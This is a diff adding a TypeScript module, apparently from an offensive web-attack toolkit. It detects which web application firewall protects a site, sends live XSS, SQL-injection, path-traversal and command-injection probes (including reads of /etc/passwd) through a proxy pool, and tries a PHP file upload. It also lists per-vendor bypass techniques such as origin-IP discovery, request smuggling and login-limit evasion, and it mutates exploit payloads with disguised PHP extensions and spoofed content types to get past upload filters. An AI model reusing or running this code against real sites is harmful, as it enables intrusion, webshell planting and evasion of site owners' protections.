@@ -1,0 +1,850 @@
+// ═══════════════════════════════════════════════════════════════
+//  WAF DETECTOR — Advanced Web Application Firewall Detection
+//  Detects: Cloudflare, Sucuri, ModSecurity, Wordfence, Akamai,
+//           AWS WAF, Imperva/Incapsula, F5 BIG-IP, Barracuda,
+//           Fortinet FortiWeb, Citrix NetScaler, DDoS-Guard, etc.
+//
+//  Methods:
+//    1. HTTP Header Fingerprinting (response headers)
+//    2. Cookie Fingerprinting (WAF-specific cookies)
+//    3. Error Page Fingerprinting (403/406/429 body patterns)
+//    4. Probe-based Detection (send suspicious payloads, observe blocks)
+//    5. DNS/IP Fingerprinting (reverse DNS, ASN lookup)
+// ═══════════════════════════════════════════════════════════════
+
+import { fetchWithPoolProxy } from "./proxy-pool";
+
+// ─── Types ───
+
+export interface WafDetectionResult {
+  detected: boolean;
+  wafName: string | null;
+  wafVendor: string | null;
+  confidence: "high" | "medium" | "low" | "none";
+  strength: "very_strong" | "strong" | "moderate" | "weak" | "none";
+  detectionMethods: string[];
+  headers: Record<string, string>;
+  cookies: string[];
+  blockBehavior: {
+    blocksXss: boolean;
+    blocksSqli: boolean;
+    blocksFileUpload: boolean;
+    blocksPathTraversal: boolean;
+    blocksCommandInjection: boolean;
+    blockRateLimit: boolean;
+  };
+  evasionRecommendations: string[];
+  rawFingerprints: string[];
+  detectedAt: string;
+}
+
+// ─── WAF Signature Database ───
+
+interface WafSignature {
+  name: string;
+  vendor: string;
+  headers: { key: string; pattern: RegExp }[];
+  cookies: RegExp[];
+  bodyPatterns: RegExp[];
+  statusCodes: number[];
+  evasionTips: string[];
+}
+
+const WAF_SIGNATURES: WafSignature[] = [
+  {
+    name: "Cloudflare",
+    vendor: "Cloudflare Inc.",
+    headers: [
+      { key: "cf-ray", pattern: /.*/ },
+      { key: "cf-cache-status", pattern: /.*/ },
+      { key: "server", pattern: /cloudflare/i },
+      { key: "cf-mitigated", pattern: /.*/ },
+      { key: "cf-chl-bypass", pattern: /.*/ },
+    ],
+    cookies: [/__cfduid/i, /__cf_bm/i, /cf_clearance/i, /cf_chl_/i],
+    bodyPatterns: [
+      /cloudflare/i,
+      /cf-error-details/i,
+      /ray id/i,
+      /attention required.*cloudflare/i,
+      /checking your browser/i,
+      /cf-browser-verification/i,
+      /cdn-cgi\/challenge-platform/i,
+    ],
+    statusCodes: [403, 503, 429],
+    evasionTips: [
+      "Find origin IP via Shodan SSL cert search, DNS history, or MX/SPF records",
+      "Use HTTP/2 multiplexing to bypass rate limits",
+      "Try direct IP access with Host header spoofing",
+      "Cloudflare doesn't inspect WebSocket frames — try WS upgrade",
+      "Use chunked transfer encoding with small chunks",
+      "Try accessing via IPv6 if origin has AAAA record",
+    ],
+  },
+  {
+    name: "Sucuri",
+    vendor: "Sucuri/GoDaddy",
+    headers: [
+      { key: "x-sucuri-id", pattern: /.*/ },
+      { key: "x-sucuri-cache", pattern: /.*/ },
+      { key: "server", pattern: /sucuri/i },
+      { key: "x-sucuri-block", pattern: /.*/ },
+    ],
+    cookies: [/sucuri_cloudproxy/i, /sucuri_/i],
+    bodyPatterns: [
+      /sucuri website firewall/i,
+      /access denied.*sucuri/i,
+      /sucuri\.net/i,
+      /cloudproxy/i,
+      /if you are the site owner/i,
+    ],
+    statusCodes: [403, 406],
+    evasionTips: [
+      "Sucuri often has weaker rules than Cloudflare — try double URL encoding",
+      "Content-Type confusion: send PHP as image/jpeg",
+      "Use null byte injection in filenames (.php%00.jpg)",
+      "Try alternate PHP extensions (.pht, .phtml, .php5)",
+      "Sucuri may not inspect POST body > 10MB",
+    ],
+  },
+  {
+    name: "ModSecurity",
+    vendor: "Trustwave/OWASP",
+    headers: [
+      { key: "server", pattern: /mod_security|modsecurity/i },
+      { key: "x-mod-security", pattern: /.*/ },
+      { key: "x-modsecurity", pattern: /.*/ },
+    ],
+    cookies: [],
+    bodyPatterns: [
+      /mod_security/i,
+      /modsecurity/i,
+      /not acceptable/i,
+      /owasp.*crs/i,
+      /rule id/i,
+      /you don't have permission/i,
+    ],
+    statusCodes: [403, 406, 501],
+    evasionTips: [
+      "ModSecurity CRS has paranoia levels — test with increasing payload complexity",
+      "Use SQL comment injection (SEL/**/ECT, UN/**/ION)",
+      "Try HPP (HTTP Parameter Pollution) with duplicate params",
+      "Multipart boundary manipulation can bypass file upload rules",
+      "Use Transfer-Encoding: chunked to split payload across chunks",
+      "Case variation on SQL keywords (SeLeCt, uNiOn)",
+    ],
+  },
+  {
+    name: "Wordfence",
+    vendor: "Defiant Inc.",
+    headers: [
+      { key: "x-wordfence-blocked", pattern: /.*/ },
+      { key: "x-wf-", pattern: /.*/ },
+    ],
+    cookies: [/wfvt_/i, /wordfence_verifiedHuman/i, /wf_loginalerted/i],
+    bodyPatterns: [
+      /wordfence/i,
+      /a potentially unsafe operation/i,
+      /your access to this site has been limited/i,
+      /generated by wordfence/i,
+      /wf-block-overlay/i,
+    ],
+    statusCodes: [403, 503],
+    evasionTips: [
+      "Wordfence runs on the same server — no origin IP bypass needed",
+      "Try accessing wp-login.php with different User-Agent strings",
+      "Wordfence rate limits are per-IP — rotate proxies",
+      "Use XMLRPC multicall to bypass login attempt limits",
+      "Try wp-json REST API endpoints which may have weaker rules",
+      "Wordfence free doesn't block country-level — try different geo proxies",
+    ],
+  },
+  {
+    name: "Akamai",
+    vendor: "Akamai Technologies",
+    headers: [
+      { key: "x-akamai-transformed", pattern: /.*/ },
+      { key: "akamai-grn", pattern: /.*/ },
+      { key: "server", pattern: /akamaighost/i },
+      { key: "x-akamai-session-info", pattern: /.*/ },
+    ],
+    cookies: [/akamai/i, /ak_bmsc/i, /bm_sv/i, /bm_sz/i],
+    bodyPatterns: [
+      /akamai/i,
+      /reference.*#\d+\.\w+/i,
+      /access denied/i,
+    ],
+    statusCodes: [403],
+    evasionTips: [
+      "Akamai Bot Manager uses browser fingerprinting — use headless Chrome with stealth",
+      "Try different TLS fingerprints (JA3 hash manipulation)",
+      "Akamai caches aggressively — try cache-busting query params",
+      "Use HTTP/2 PUSH_PROMISE to confuse request tracking",
+    ],
+  },
+  {
+    name: "AWS WAF",
+    vendor: "Amazon Web Services",
+    headers: [
+      { key: "x-amzn-requestid", pattern: /.*/ },
+      { key: "x-amz-cf-id", pattern: /.*/ },
+      { key: "x-amz-apigw-id", pattern: /.*/ },
+    ],
+    cookies: [/awsalb/i, /awsalbcors/i, /AWSALB/],
+    bodyPatterns: [
+      /aws/i,
+      /request blocked/i,
+      /waf/i,
+    ],
+    statusCodes: [403],
+    evasionTips: [
+      "AWS WAF uses regex rules — try Unicode normalization bypass",
+      "Chunked transfer encoding can bypass body inspection",
+      "AWS WAF has size limits — payloads > 8KB may not be inspected",
+      "Try HTTP method override (X-HTTP-Method-Override: PUT)",
+    ],
+  },
+  {
+    name: "Imperva/Incapsula",
+    vendor: "Imperva Inc.",
+    headers: [
+      { key: "x-iinfo", pattern: /.*/ },
+      { key: "x-cdn", pattern: /imperva|incapsula/i },
+    ],
+    cookies: [/incap_ses/i, /visid_incap/i, /nlbi_/i, /reese84/i],
+    bodyPatterns: [
+      /incapsula/i,
+      /imperva/i,
+      /incident id/i,
+      /powered by incapsula/i,
+      /request unsuccessful/i,
+    ],
+    statusCodes: [403],
+    evasionTips: [
+      "Imperva uses JavaScript challenges — solve with headless browser",
+      "Try accessing via direct IP if available",
+      "Imperva has strict bot detection — use residential proxies",
+      "Content-Type manipulation may bypass upload rules",
+    ],
+  },
+  {
+    name: "F5 BIG-IP ASM",
+    vendor: "F5 Networks",
+    headers: [
+      { key: "server", pattern: /big-?ip/i },
+      { key: "x-cnection", pattern: /.*/ },
+      { key: "x-wa-info", pattern: /.*/ },
+    ],
+    cookies: [/BIGipServer/i, /TS[0-9a-f]{8}/i, /f5_cspm/i, /f5avraaaaaaa/i],
+    bodyPatterns: [
+      /the requested url was rejected/i,
+      /please consult with your administrator/i,
+      /support id/i,
+      /f5/i,
+    ],
+    statusCodes: [403],
+    evasionTips: [
+      "F5 ASM uses learning mode — send benign requests first to train it",
+      "Try HTTP desync attacks (CL.TE or TE.CL smuggling)",
+      "F5 cookie decoding reveals internal IPs — use for direct access",
+      "Parameter pollution can bypass F5 parameter validation",
+    ],
+  },
+  {
+    name: "Barracuda",
+    vendor: "Barracuda Networks",
+    headers: [
+      { key: "server", pattern: /barracuda/i },
+      { key: "barra_counter_session", pattern: /.*/ },
+    ],
+    cookies: [/barra_counter_session/i, /BNI__BARRACUDA/i],
+    bodyPatterns: [
+      /barracuda/i,
+      /you have been blocked/i,
+      /barracuda networks/i,
+    ],
+    statusCodes: [403],
+    evasionTips: [
+      "Barracuda has weaker bot detection than Cloudflare/Akamai",
+      "Try URL encoding tricks and path normalization bypass",
+      "Barracuda may not inspect WebSocket traffic",
+    ],
+  },
+  {
+    name: "Fortinet FortiWeb",
+    vendor: "Fortinet Inc.",
+    headers: [
+      { key: "server", pattern: /fortiweb/i },
+      { key: "fortiwafsid", pattern: /.*/ },
+    ],
+    cookies: [/FORTIWAFSID/i, /cookiesession1/i],
+    bodyPatterns: [
+      /fortiweb/i,
+      /fortigate/i,
+      /web page blocked/i,
+      /fortinet/i,
+    ],
+    statusCodes: [403],
+    evasionTips: [
+      "FortiWeb has known bypass via HTTP/2 downgrade",
+      "Try multipart boundary manipulation",
+      "FortiWeb may not inspect compressed (gzip) request bodies",
+    ],
+  },
+  {
+    name: "DDoS-Guard",
+    vendor: "DDoS-Guard",
+    headers: [
+      { key: "server", pattern: /ddos-guard/i },
+      { key: "x-ddos-protection", pattern: /.*/ },
+    ],
+    cookies: [/__ddg/i, /ddg_/i],
+    bodyPatterns: [
+      /ddos-guard/i,
+      /ddos.guard/i,
+      /checking your browser/i,
+    ],
+    statusCodes: [403, 503],
+    evasionTips: [
+      "DDoS-Guard uses JavaScript challenges similar to Cloudflare",
+      "Try solving the JS challenge with headless browser",
+      "DDoS-Guard has weaker rules than Cloudflare — basic encoding may work",
+    ],
+  },
+  {
+    name: "Citrix NetScaler",
+    vendor: "Citrix Systems",
+    headers: [
+      { key: "via", pattern: /ns-cache/i },
+      { key: "cneonction", pattern: /.*/ },
+      { key: "x-ns-", pattern: /.*/ },
+    ],
+    cookies: [/citrix_ns_id/i, /NSC_/i, /ns_af/i],
+    bodyPatterns: [
+      /netscaler/i,
+      /citrix/i,
+      /ns_af/i,
+    ],
+    statusCodes: [403],
+    evasionTips: [
+      "NetScaler AppFirewall has known bypass via HTTP parameter pollution",
+      "Try request smuggling via Content-Length/Transfer-Encoding mismatch",
+      "NetScaler may not inspect multipart/form-data correctly",
+    ],
+  },
+];
+
+// ─── Probe Payloads for Active Detection ───
+
+interface ProbePayload {
+  name: string;
+  path: string;
+  method: string;
+  headers?: Record<string, string>;
+  body?: string;
+  category: "xss" | "sqli" | "file_upload" | "path_traversal" | "command_injection" | "rate_limit";
+}
+
+const PROBE_PAYLOADS: ProbePayload[] = [
+  {
+    name: "XSS Probe",
+    path: "/?test=<script>alert(1)</script>",
+    method: "GET",
+    category: "xss",
+  },
+  {
+    name: "SQLi Probe",
+    path: "/?id=1' OR '1'='1",
+    method: "GET",
+    category: "sqli",
+  },
+  {
+    name: "SQLi UNION Probe",
+    path: "/?id=1 UNION SELECT 1,2,3--",
+    method: "GET",
+    category: "sqli",
+  },
+  {
+    name: "Path Traversal Probe",
+    path: "/?file=../../../etc/passwd",
+    method: "GET",
+    category: "path_traversal",
+  },
+  {
+    name: "Command Injection Probe",
+    path: "/?cmd=;cat /etc/passwd",
+    method: "GET",
+    category: "command_injection",
+  },
+  {
+    name: "File Upload Probe",
+    path: "/wp-content/uploads/test.php",
+    method: "PUT",
+    headers: { "Content-Type": "application/x-php" },
+    body: "<?php echo 'test'; ?>",
+    category: "file_upload",
+  },
+];
+
+// ═══════════════════════════════════════════════════════════════
+//  MAIN: Detect WAF
+// ═══════════════════════════════════════════════════════════════
+
+export async function detectWaf(targetUrl: string): Promise<WafDetectionResult> {
+  const result: WafDetectionResult = {
+    detected: false,
+    wafName: null,
+    wafVendor: null,
+    confidence: "none",
+    strength: "none",
+    detectionMethods: [],
+    headers: {},
+    cookies: [],
+    blockBehavior: {
+      blocksXss: false,
+      blocksSqli: false,
+      blocksFileUpload: false,
+      blocksPathTraversal: false,
+      blocksCommandInjection: false,
+      blockRateLimit: false,
+    },
+    evasionRecommendations: [],
+    rawFingerprints: [],
+    detectedAt: new Date().toISOString(),
+  };
+
+  const scores: Map<string, number> = new Map();
+  const detectedMethods: Map<string, string[]> = new Map();
+
+  // Normalize URL
+  const baseUrl = targetUrl.replace(/\/+$/, "");
+
+  // ─── Step 1: Passive Header Fingerprinting ───
+  try {
+    const proxyResult = await fetchWithPoolProxy(baseUrl, {
+      method: "GET",
+      headers: {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      },
+      redirect: "follow",
+    });
+    const resp = proxyResult.response;
+
+    // Collect all response headers
+    resp.headers.forEach((value, key) => {
+      result.headers[key.toLowerCase()] = value;
+    });
+
+    // Collect cookies
+    const setCookies = resp.headers.getSetCookie?.() || [];
+    result.cookies = setCookies;
+
+    const body = await resp.text();
+
+    // Match against WAF signatures
+    for (const sig of WAF_SIGNATURES) {
+      let sigScore = 0;
+      const methods: string[] = [];
+
+      // Header matching
+      for (const hdr of sig.headers) {
+        const headerValue = result.headers[hdr.key.toLowerCase()];
+        if (headerValue && hdr.pattern.test(headerValue)) {
+          sigScore += 30;
+          methods.push(`header:${hdr.key}`);
+          result.rawFingerprints.push(`Header ${hdr.key}: ${headerValue}`);
+        }
+      }
+
+      // Cookie matching
+      for (const cookiePattern of sig.cookies) {
+        for (const cookie of setCookies) {
+          if (cookiePattern.test(cookie)) {
+            sigScore += 20;
+            methods.push(`cookie:${cookiePattern.source}`);
+            result.rawFingerprints.push(`Cookie: ${cookie.substring(0, 80)}`);
+          }
+        }
+      }
+
+      // Body pattern matching
+      for (const bodyPattern of sig.bodyPatterns) {
+        if (bodyPattern.test(body)) {
+          sigScore += 15;
+          methods.push(`body:${bodyPattern.source}`);
+        }
+      }
+
+      if (sigScore > 0) {
+        scores.set(sig.name, (scores.get(sig.name) || 0) + sigScore);
+        detectedMethods.set(sig.name, [...(detectedMethods.get(sig.name) || []), ...methods]);
+      }
+    }
+  } catch (err: any) {
+    result.rawFingerprints.push(`Passive scan error: ${err.message}`);
+  }
+
+  // ─── Step 2: Active Probe Detection ───
+  let blockedCount = 0;
+  const probeResults: { category: string; blocked: boolean }[] = [];
+
+  for (const probe of PROBE_PAYLOADS) {
+    try {
+      const probeUrl = `${baseUrl}${probe.path}`;
+      const probeProxy = await fetchWithPoolProxy(probeUrl, {
+        method: probe.method,
+        headers: {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+          ...(probe.headers || {}),
+        },
+        body: probe.body || undefined,
+        redirect: "follow",
+      });
+      const resp = probeProxy.response;
+
+      const isBlocked = resp.status === 403 || resp.status === 406 || resp.status === 429 || resp.status === 503;
+
+      if (isBlocked) {
+        blockedCount++;
+        const body = await resp.text();
+
+        // Check which WAF blocked it
+        for (const sig of WAF_SIGNATURES) {
+          let matched = false;
+          for (const bodyPattern of sig.bodyPatterns) {
+            if (bodyPattern.test(body)) {
+              scores.set(sig.name, (scores.get(sig.name) || 0) + 25);
+              detectedMethods.set(sig.name, [...(detectedMethods.get(sig.name) || []), `probe_block:${probe.name}`]);
+              matched = true;
+              break;
+            }
+          }
+          // Check status code match
+          if (!matched && sig.statusCodes.includes(resp.status)) {
+            // Check headers on blocked response too
+            for (const hdr of sig.headers) {
+              const headerValue = resp.headers.get(hdr.key);
+              if (headerValue && hdr.pattern.test(headerValue)) {
+                scores.set(sig.name, (scores.get(sig.name) || 0) + 20);
+                detectedMethods.set(sig.name, [...(detectedMethods.get(sig.name) || []), `probe_header:${probe.name}:${hdr.key}`]);
+                break;
+              }
+            }
+          }
+        }
+      }
+
+      probeResults.push({ category: probe.category, blocked: isBlocked });
+
+      // Small delay between probes to avoid rate limiting ourselves
+      await new Promise(r => setTimeout(r, 500));
+
+    } catch (err: any) {
+      // Connection error might indicate blocking
+      probeResults.push({ category: probe.category, blocked: true });
+      blockedCount++;
+    }
+  }
+
+  // ─── Step 3: Analyze Block Behavior ───
+  for (const pr of probeResults) {
+    if (pr.blocked) {
+      switch (pr.category) {
+        case "xss": result.blockBehavior.blocksXss = true; break;
+        case "sqli": result.blockBehavior.blocksSqli = true; break;
+        case "file_upload": result.blockBehavior.blocksFileUpload = true; break;
+        case "path_traversal": result.blockBehavior.blocksPathTraversal = true; break;
+        case "command_injection": result.blockBehavior.blocksCommandInjection = true; break;
+        case "rate_limit": result.blockBehavior.blockRateLimit = true; break;
+      }
+    }
+  }
+
+  // ─── Step 4: Determine Winner ───
+  let bestWaf: string | null = null;
+  let bestScore = 0;
+
+  for (const [name, score] of Array.from(scores.entries())) {
+    if (score > bestScore) {
+      bestScore = score;
+      bestWaf = name;
+    }
+  }
+
+  if (bestWaf && bestScore >= 20) {
+    result.detected = true;
+    result.wafName = bestWaf;
+    const sig = WAF_SIGNATURES.find(s => s.name === bestWaf);
+    result.wafVendor = sig?.vendor || null;
+    result.detectionMethods = detectedMethods.get(bestWaf) || [];
+    result.evasionRecommendations = sig?.evasionTips || [];
+
+    // Confidence based on score
+    if (bestScore >= 60) result.confidence = "high";
+    else if (bestScore >= 40) result.confidence = "medium";
+    else result.confidence = "low";
+
+    // Strength based on block behavior
+    const blockedCategories = Object.values(result.blockBehavior).filter(Boolean).length;
+    if (blockedCategories >= 5) result.strength = "very_strong";
+    else if (blockedCategories >= 3) result.strength = "strong";
+    else if (blockedCategories >= 2) result.strength = "moderate";
+    else if (blockedCategories >= 1) result.strength = "weak";
+    else result.strength = "weak"; // Detected but nothing blocked in probes
+  } else if (blockedCount >= 3) {
+    // Generic WAF detected via blocking behavior
+    result.detected = true;
+    result.wafName = "Unknown WAF";
+    result.wafVendor = "Unknown";
+    result.confidence = "low";
+    result.detectionMethods = ["probe_blocking"];
+    result.evasionRecommendations = [
+      "Try double URL encoding for all payloads",
+      "Use chunked transfer encoding",
+      "Try alternate file extensions (.pht, .phtml, .php5)",
+      "Use null byte injection in filenames",
+      "Try Content-Type confusion (send PHP as image/jpeg)",
+    ];
+
+    const blockedCategories = Object.values(result.blockBehavior).filter(Boolean).length;
+    if (blockedCategories >= 4) result.strength = "strong";
+    else if (blockedCategories >= 2) result.strength = "moderate";
+    else result.strength = "weak";
+  }
+
+  return result;
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  AUTO-EVASION: Select best evasion strategy based on WAF type
+// ═══════════════════════════════════════════════════════════════
+
+export interface EvasionStrategy {
+  wafName: string;
+  primaryTechniques: string[];
+  filenameMutations: string[];
+  contentTypeTricks: string[];
+  encodingTricks: string[];
+  headerManipulations: Record<string, string>[];
+  requestModifications: string[];
+}
+
+export function getEvasionStrategy(wafResult: WafDetectionResult): EvasionStrategy {
+  const waf = wafResult.wafName?.toLowerCase() || "generic";
+
+  const strategy: EvasionStrategy = {
+    wafName: wafResult.wafName || "Unknown",
+    primaryTechniques: [],
+    filenameMutations: [],
+    contentTypeTricks: [],
+    encodingTricks: [],
+    headerManipulations: [],
+    requestModifications: [],
+  };
+
+  // Base techniques for all WAFs
+  strategy.filenameMutations = [
+    ".php%00.jpg",
+    ".pht",
+    ".phtml",
+    ".php5",
+    ".pHp",
+    ".PhP",
+  ];
+  strategy.contentTypeTricks = [
+    "image/jpeg",
+    "image/gif",
+    "image/png",
+    "application/octet-stream",
+    "text/plain",
+  ];
+  strategy.encodingTricks = [
+    "double_url_encode",
+    "unicode_normalization",
+    "null_byte",
+  ];
+
+  // WAF-specific strategies
+  if (waf.includes("cloudflare")) {
+    strategy.primaryTechniques = [
+      "origin_ip_bypass",      // Find real IP via Shodan/DNS history
+      "http2_multiplexing",    // Bypass rate limits
+      "websocket_upgrade",     // WS frames not inspected
+      "chunked_encoding",      // Split payload across chunks
+      "ipv6_access",           // Try AAAA record
+    ];
+    strategy.headerManipulations = [
+      { "X-Forwarded-For": "127.0.0.1" },
+      { "X-Real-IP": "127.0.0.1" },
+      { "CF-Connecting-IP": "127.0.0.1" },
+    ];
+    strategy.requestModifications = [
+      "Use direct origin IP if discovered",
+      "Add cache-busting query params",
+      "Use HTTP/2 with HPACK compression",
+    ];
+  } else if (waf.includes("sucuri")) {
+    strategy.primaryTechniques = [
+      "double_url_encoding",
+      "content_type_confusion",
+      "null_byte_injection",
+      "alternate_php_extensions",
+      "large_body_bypass",     // Sucuri may skip bodies > 10MB
+    ];
+    strategy.filenameMutations.push(".php.jpg", ".php.png", ".php::$DATA");
+    strategy.requestModifications = [
+      "Pad request body to > 10MB with junk data",
+      "Use multipart boundary manipulation",
+    ];
+  } else if (waf.includes("modsecurity")) {
+    strategy.primaryTechniques = [
+      "sql_comment_injection",
+      "http_parameter_pollution",
+      "multipart_boundary_manipulation",
+      "chunked_transfer_encoding",
+      "case_variation",
+    ];
+    strategy.encodingTricks.push("sql_comment_split", "hpp_duplicate_params");
+    strategy.requestModifications = [
+      "Split SQL keywords with /**/ comments",
+      "Use HPP with duplicate parameters",
+      "Try different paranoia level payloads",
+    ];
+  } else if (waf.includes("wordfence")) {
+    strategy.primaryTechniques = [
+      "proxy_rotation",        // Rate limits per IP
+      "xmlrpc_multicall",      // Bypass login limits
+      "rest_api_access",       // Weaker rules on REST API
+      "user_agent_rotation",
+      "geo_proxy_rotation",    // Free version doesn't geo-block
+    ];
+    strategy.requestModifications = [
+      "Rotate User-Agent strings per request",
+      "Use XMLRPC multicall for batch operations",
+      "Target wp-json endpoints instead of wp-admin",
+    ];
+  } else if (waf.includes("akamai")) {
+    strategy.primaryTechniques = [
+      "tls_fingerprint_rotation",  // JA3 hash manipulation
+      "headless_chrome_stealth",   // Solve bot challenges
+      "cache_busting",
+    ];
+    strategy.requestModifications = [
+      "Use headless Chrome with stealth plugin",
+      "Rotate TLS fingerprints",
+      "Add cache-busting query parameters",
+    ];
+  } else if (waf.includes("imperva") || waf.includes("incapsula")) {
+    strategy.primaryTechniques = [
+      "js_challenge_solving",
+      "direct_ip_access",
+      "residential_proxy",
+      "content_type_manipulation",
+    ];
+    strategy.requestModifications = [
+      "Solve JavaScript challenges with headless browser",
+      "Use residential proxies for bot detection bypass",
+    ];
+  } else if (waf.includes("aws")) {
+    strategy.primaryTechniques = [
+      "unicode_normalization",
+      "chunked_encoding",
+      "large_payload_bypass",   // > 8KB not inspected
+      "method_override",
+    ];
+    strategy.headerManipulations.push({ "X-HTTP-Method-Override": "PUT" });
+    strategy.requestModifications = [
+      "Pad payload to > 8KB to bypass inspection",
+      "Use X-HTTP-Method-Override header",
+    ];
+  } else if (waf.includes("f5") || waf.includes("big-ip")) {
+    strategy.primaryTechniques = [
+      "http_desync",           // CL.TE or TE.CL smuggling
+      "parameter_pollution",
+      "cookie_decode_ip",      // F5 cookies reveal internal IPs
+    ];
+    strategy.requestModifications = [
+      "Try HTTP request smuggling (CL.TE)",
+      "Decode F5 cookie for internal IP addresses",
+    ];
+  }
+
+  // Generic fallback techniques
+  if (strategy.primaryTechniques.length === 0) {
+    strategy.primaryTechniques = [
+      "double_url_encoding",
+      "null_byte_injection",
+      "content_type_confusion",
+      "chunked_encoding",
+      "alternate_extensions",
+    ];
+  }
+
+  return strategy;
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  APPLY EVASION: Modify exploit payload based on strategy
+// ═══════════════════════════════════════════════════════════════
+
+export function applyEvasionToPayload(
+  payload: string,
+  filename: string,
+  strategy: EvasionStrategy,
+): { modifiedPayloads: { payload: string; filename: string; contentType: string; technique: string }[] } {
+  const variants: { payload: string; filename: string; contentType: string; technique: string }[] = [];
+  const baseName = filename.replace(/\.[^.]+$/, "");
+
+  // Generate filename mutations
+  for (const mutation of strategy.filenameMutations) {
+    variants.push({
+      payload,
+      filename: `${baseName}${mutation}`,
+      contentType: "application/x-php",
+      technique: `filename_mutation:${mutation}`,
+    });
+  }
+
+  // Generate content-type tricks
+  for (const ct of strategy.contentTypeTricks) {
+    variants.push({
+      payload,
+      filename,
+      contentType: ct,
+      technique: `content_type:${ct}`,
+    });
+  }
+
+  // Generate encoding tricks
+  for (const encoding of strategy.encodingTricks) {
+    let modifiedPayload = payload;
+    switch (encoding) {
+      case "double_url_encode":
+        modifiedPayload = payload.replace(/[<>'"&;(){}]/g, (c) => {
+          const hex = c.charCodeAt(0).toString(16);
+          return `%25${hex}`;
+        });
+        break;
+      case "unicode_normalization":
+        modifiedPayload = payload.replace(/\//g, "\uff0f").replace(/\\/g, "\uff3c");
+        break;
+      case "null_byte":
+        // Add null byte before extension check
+        break;
+      case "sql_comment_split":
+        modifiedPayload = payload.replace(/SELECT/gi, "SEL/**/ECT").replace(/UNION/gi, "UN/**/ION");
+        break;
+    }
+    if (modifiedPayload !== payload) {
+      variants.push({
+        payload: modifiedPayload,
+        filename,
+        contentType: "application/x-php",
+        technique: `encoding:${encoding}`,
+      });
+    }
+  }
+
+  return { modifiedPayloads: variants };
+}
